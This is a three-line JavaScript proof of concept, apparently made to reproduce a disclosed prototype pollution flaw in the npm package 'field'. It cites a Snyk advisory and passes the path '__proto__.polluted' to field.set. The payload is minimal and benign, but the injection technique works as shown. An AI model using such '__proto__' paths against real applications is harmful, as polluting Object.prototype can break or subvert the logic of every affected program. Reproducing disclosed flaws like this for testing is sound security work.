//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
var field = require('field')
field.set({}, '__proto__.polluted', 'yes')
